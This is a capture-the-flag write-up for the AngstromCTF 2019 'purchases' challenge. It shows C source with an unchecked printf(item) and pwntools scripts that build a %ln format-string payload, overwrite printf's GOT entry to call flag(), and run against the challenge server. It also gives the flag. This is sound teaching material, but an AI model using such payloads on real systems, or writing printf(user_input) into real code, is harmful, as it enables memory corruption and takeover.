# Purchases  
Description:

This grumpy [shop owner](purchases) won't sell me his flag! At least I have
his [source](purchases.c).

`/problems/2019/purchases/`

`nc shell.actf.co 19011`

Author: defund

Looking at the source:  
```c  
#include <stdlib.h>  
#include <stdio.h>  
#include <string.h>

void flag() {  
	system("/bin/cat flag.txt");  
}

int main() {  
	gid_t gid = getegid();  
	setresgid(gid, gid, gid);  
	setvbuf(stdin, NULL, _IONBF, 0);  
	setvbuf(stdout, NULL, _IONBF, 0);

	char item[60];  
	printf("What item would you like to purchase? ");  
	fgets(item, sizeof(item), stdin);  
	item[strlen(item)-1] = 0;

	if (strcmp(item, "nothing") == 0) {  
		printf("Then why did you even come here? ");  
	} else {  
		printf("You don't have any money to buy ");  
		printf(item);  
		printf("s. You're wasting your time! We don't even sell ");  
		printf(item);  
		printf("s. Leave this place and buy ");  
		printf(item);  
		printf(" somewhere else. ");  
	}

	printf("Get out!\n");  
	return 0;  
}  
```  
We confirm this is a Format String exploit!

Because of `printf(item)`

## Reference  
[A simple Format String exploit example - bin
0x11](https://www.youtube.com/watch?v=0WvrSfcdq1I&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=18)

[Global Offset Table (GOT) and Procedure Linkage Table (PLT) - bin
0x12](https://www.youtube.com/watch?v=kUk5pw4w0h4&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=19)

[Format String Exploit and overwrite the Global Offset Table - bin
0x13](https://www.youtube.com/watch?v=t1LH9D5cuK4&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=20)

Our plan is to overwrite the `printf` function to the `flag` function using
format string

```c  
printf(item);   //Overwrite printf()  
printf("s. You're wasting your time! We don't even sell ");     //This line
will execute flag()  
```

First, we need to find the offset number (Like buffer overflow need to find
the buffer size)

By using pwntools we can easily do this:  
```python  
from pwn import *  
elf = ELF('./purchases')  
p = elf.process()  
p.recvuntil("purchase? ")  
p.sendline('aaaaaaaa'+'%p '*10)  
print p.recv()  
```  
Output:  
```  
You don't have any money to buy aaaaaaaa0x7ffe22bddf00 0x7f6bcbb7e8c0 (nil)
0x7f6bcbb83500 0x7f6bcbb7e8c0 0xc2 0x22be05d6 0x6161616161616161
0x7025207025207025 0x2520702520702520 s. You're wasting your time! We don't
even sell aaaaaaaa0x7ffe22bddf00 0x7f6bcbb7e8c0 (nil) 0x7f6bcbb83500
0x7ffe22bddd88 0xc2 0x22be05d6 0x6161616161616161 0x7025207025207025
0x2520702520702520 s. Leave this place and buy aaaaaaaa0x7ffe22bddf00
0x7f6bcbb7e8c0 (nil) 0x7f6bcbb83500 0x7ffe22bddd88 0xc2 0x22be05d6
0x6161616161616161 0x7025207025207025 0x2520702520702520  somewhere else. Get
out!  
```  
We can clearly see the `0x6161616161616161` which is `aaaaaaaa` in hex

So the offset is 10 - 2 = 8

By using `%8$p` we can printf only the 8th argument:  
```python  
from pwn import *  
elf = ELF('./purchases')  
p = elf.process()  
p.recvuntil("purchase? ")  
p.sendline('aaaaaaaa%8$p')  
print p.recv()  
```  
Output:  
```  
You don't have any money to buy aaaaaaaa0x6161616161616161s. You're wasting
your time! We don't even sell aaaaaaaa0x6161616161616161s. Leave this place
and buy aaaaaaaa0x6161616161616161 somewhere else. Get out!  
```  
Yay! Try to replace the `aaaaaaaa` to the printf address:  
```python  
from pwn import *  
elf = ELF('./purchases')  
printf_address = elf.symbols['got.printf']      # Get the printf address  
p = elf.process()  
p.recvuntil("purchase? ")  
p.sendline(p64(printf_address)+'%8$p')          # Convert the address to
string  
print p.recv()  
```  
But the output is not what I expected:  
```  
You don't have any money to buy @@s. You're wasting your time! We don't even
sell @@s. Leave this place and buy @@ somewhere else. Get out!  
```  
Use `print hex(printf_address)` we get `0x404040`

But `print p64(printf_address)` we get `@@@\x00\x00\x00\x00\x00`

That is because C compiler see the null byte `\x00` so it print 2 characters
then it stops

So we change our plan, is to put the address after the Format String `%8$p`  
```python  
from pwn import *  
elf = ELF('./purchases')  
printf_address = elf.symbols['got.printf']      # Get the printf address  
p = elf.process()  
p.recvuntil("purchase? ")  
p.sendline('%8$p'+p64(printf_address))          # Convert the address to
string  
print p.recv()  
```  
But the output is not correct:  
```  
You don't have any money to buy 0x404070243825@@s. You're wasting your time!
We don't even sell 0x404070243825@@s. Leave this place and buy
0x404070243825@@ somewhere else. Get out!  
```  
We guess the Format String must be in 8 bytes format:  
```  
Before:  
[      8th argument    ][          9th argument        ]  
[%][8][$][p][40][40][40][00][00][00][00][00]...

After:  
[      8th argument    ][          9th argument        ]  
[%][8][$][p][ ][ ][ ][ ][40][40][40][00][00][00][00][00]  
```  
We added four space into the format string and change `%8$p` to `%9$p` because
9th argument  
```python  
from pwn import *  
elf = ELF('./purchases')  
printf_address = elf.symbols['got.printf']      # Get the printf address  
p = elf.process()  
p.recvuntil("purchase? ")  
p.sendline('%9$p    '+p64(printf_address))              # Convert the address
to string  
print p.recv()  
```  
But the output lost one byte:  
```  
You don't have any money to buy 0x4040    @@s. You're wasting your time! We
don't even sell 0x4040    @@s. Leave this place and buy 0x4040    @@ somewhere
else. Get out!  
```  
We're confuse about this, we try to delete the null bytes:  
```python  
p.sendline('%9$p    '+p64(printf_address)[:3])  
```  
And the output is almost correct:  
```  
You don't have any money to buy 0x7f0000404040    @@@s. You're wasting your
time! We don't even sell 0x7f0000404040    @@@s. Leave this place and buy
0x7f0000404040    @@@ somewhere else. Get out!  
```  
I guess we overwritten some address in the stack

So we add 7 more spaces (16 - 5 + 4) , add 1 to the argument  
```python  
p.sendline('%10$p           '+p64(printf_address)[:3])  
```  
Yay! Finally get the correct address:  
```  
You don't have any money to buy 0x404040           @@@s. You're wasting your
time! We don't even sell 0x404040           @@@s. Leave this place and buy
0x404040           @@@ somewhere else. Get out!  
```  
Using `rjust(16)` or `ljust(16)` to add space to the input instead of typing
them:  
```python  
p.sendline('%10$p'.rjust(16)+p64(printf_address)[:3])  
```  
Its time for the real thing!

According to the man page of printf:  
```  
Conversion specifiers:  
...  
...  
...  
n       The  number  of  characters written so far is stored into the integer
pointed to by the corresponding argument.

BUGS:  
	Code such as printf(foo); often indicates a bug, since foo may contain a % character.  If  foo  comes  from  untrusted  user  
	input, it may contain %n, causing the printf() call to write to memory and creating a security hole.

```  
if we execute `printf("hello world %n",some_address)`, it will print `hello
world ` and store 12 (number of printed characters) into `some_address`

Means we need to type number of characters in flag function address which is
alot and impossible

Because the buffer is only 60 characters:  
```c  
char item[60];  
```  
Using Format String we also can print alot of characters with spaces:  
```c  
print("%999i",1234);  
//output:  
//[999 of spaces]1234  
```  
Ok lets construct the payload:  
```python  
flag = elf.symbols['flag']                      # Get the function flag()
address  
flag = str(flag)                                        # Convert to string  
payload = '%' + flag + 'x%10$ln'        # Using ln because of 8 bytes address  
p.sendline(payload.rjust(16)+p64(printf_address)[:3])  
```  
Created a fake flag in current directory

And we execute the script, and it worked!!:  
```  
...  
...  
...  
cfe79340@@@SKR{flag}  
[*] Got EOF while reading in interactive  
```  
Changing the process to netcat and execute the script:  
```python  
from pwn import *  
elf = ELF('./purchases')  
printf_address = elf.symbols['got.printf']  
flag = elf.symbols['flag']                      # Get the function flag()
address  
flag = str(flag)                                        # Convert to string  
payload = '%' + flag + 'x%10$ln'        # Using ln because of 8 bytes address  
# p = elf.process()  
p = remote('shell.actf.co',19011)  
p.recvuntil("purchase? ")  
p.sendline(payload.rjust(16)+p64(printf_address)[:3])  
p.interactive()  
```  
We get the Flag!!!!!  
```  
efc80510@@@actf{limited_edition_flag}Segmentation fault (core dumped)  
[*] Got EOF while reading in interactive  
```  
[Full script](solve.py)

## Flag  
> actf{limited_edition_flag}

Original writeup
(https://github.com/Hong5489/AngstormCTF2019/tree/master/purchases).